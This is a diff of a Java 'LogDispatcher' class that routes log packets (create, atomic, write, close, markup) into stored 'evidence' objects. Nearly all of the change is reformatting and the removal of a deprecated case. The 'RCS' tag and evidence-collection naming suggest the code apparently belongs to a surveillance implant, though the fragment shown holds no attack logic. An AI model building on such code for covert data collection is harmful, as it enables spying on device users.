@@ -97,51 +97,44 @@ public class LogDispatcher extends Thread implements Runnable {
 		}
 
 		switch (p.getCommand()) {
-		case LogR.LOG_CREATE:
-			Log.d("RCS", "processQueue() got LOG_CREATE");
-			createLog(p);
-			break;
+			case LogR.LOG_CREATE:
+				Log.d("RCS", "processQueue() got LOG_CREATE");
+				createLog(p);
+				break;
 
-		case LogR.LOG_ATOMIC:
-			Log.d("RCS", "processQueue() got LOG_ATOMIC");
-			atomicLog(p);
-			break;
+			case LogR.LOG_ATOMIC:
+				Log.d("RCS", "processQueue() got LOG_ATOMIC");
+				atomicLog(p);
+				break;
 
-		case LogR.LOG_APPEND:
-			Log
-					.e("RCS",
-							"processQueue() got LOG_APPEND: DEPRECATED, use write");
-			writeLog(p);
-			break;
+			case LogR.LOG_WRITE:
+				Log.d("RCS", "processQueue() got LOG_WRITE");
+				writeLog(p);
+				break;
 
-		case LogR.LOG_WRITE:
-			Log.d("RCS", "processQueue() got LOG_WRITE");
-			writeLog(p);
-			break;
+			case LogR.LOG_CLOSE:
+				Log.d("RCS", "processQueue() got LOG_CLOSE");
+				closeLog(p);
+				break;
 
-		case LogR.LOG_CLOSE:
-			Log.d("RCS", "processQueue() got LOG_CLOSE");
-			closeLog(p);
-			break;
+			case LogR.LOG_REMOVE:
+				Log.e("RCS", "processQueue() got LOG_REMOVE: DEPRECATED");
+				// removeLog(p);
+				break;
 
-		case LogR.LOG_REMOVE:
-			Log.e("RCS", "processQueue() got LOG_REMOVE: DEPRECATED");
-			// removeLog(p);
-			break;
+			case LogR.LOG_REMOVEALL:
+				Log.e("RCS", "processQueue() got LOG_REMOVEALL: DEPRECATED");
+				// removeAll();
+				break;
 
-		case LogR.LOG_REMOVEALL:
-			Log.e("RCS", "processQueue() got LOG_REMOVEALL: DEPRECATED");
-			// removeAll();
-			break;
+			case LogR.LOG_WRITEMRK:
+				Log.d("RCS", "processQueue() got LOG_WRITEMRK");
+				writeMarkup(p);
+				break;
 
-		case LogR.LOG_WRITEMRK:
-			Log.d("RCS", "processQueue() got LOG_WRITEMRK");
-			writeMarkup(p);
-			break;
-
-		default:
-			Log.e("RCS", "processQueue() got LOG_UNKNOWN");
-			break;
+			default:
+				Log.e("RCS", "processQueue() got LOG_UNKNOWN");
+				break;
 		}
 
 		return;
@@ -297,8 +290,9 @@ public class LogDispatcher extends Thread implements Runnable {
 	/**
 	 * Creates a simple log, copies the payload and closes it in one atomic
 	 * step.
-	 *
-	 * @param p the p
+	 * 
+	 * @param p
+	 *            the p
 	 */
 	private void atomicLog(final Packet p) {
 		Check.ensures(!evidences.containsKey(p.getId()),
@@ -327,8 +321,8 @@ public class LogDispatcher extends Thread implements Runnable {
 
 		final Evidence evidence = evidences.get(p.getId());
 		final boolean ret = evidence.writeEvidence(p.peek());
+		
 		return ret;
-
 	}
 
 	/**
